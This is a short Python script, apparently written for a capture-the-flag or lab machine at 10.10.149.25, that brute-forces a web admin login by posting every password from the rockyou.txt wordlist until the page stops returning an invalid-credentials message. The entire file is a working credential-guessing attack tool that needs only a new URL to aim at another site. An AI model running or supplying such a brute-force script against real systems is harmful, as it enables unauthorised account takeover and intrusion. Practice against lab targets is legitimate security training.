import requests
import sys

def login(password):
	url = "http://10.10.149.25/admin/"
	# print(requests.get(url).cookies.get_dict())
	# sys.exit(1)
	data = {
	'user' : 'admin',
	'pass' : password
	}

	proxy = {
	'http' : '127.0.0.1:8080'
	}

	headers = {
		'User-Agent' : 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Language' : 'en-US,en;q=0.5',
		'Accept-Encoding' : 'gzip, deflate',
		'Content-Type' : 'application/x-www-form-urlencoded',
		'Content-Length' : '21',
		'Origin' : 'http://10.10.149.25',
		'Connection' : 'close',
		'Referer' : 'http://10.10.149.25/admin/',
		'Upgrade-Insecure-Requests' : '1'
		}
	cookie = requests.get(url).cookies.get_dict()

	response = requests.post(url,data=data,proxies=proxy).text

	print(response)
	if "Username or password invalid" in response:
		return False
	return True

print(login('admin'))
print(login('123456'))

wordlist = open("/usr/share/wordlists/rockyou.txt", "r")

for word in wordlist:
	word = word[:len(word) - 1]
	print("Trying ",word,end = "\r")
	if login(word):
		print("\nFound Password: ",word)
		sys.exit(1)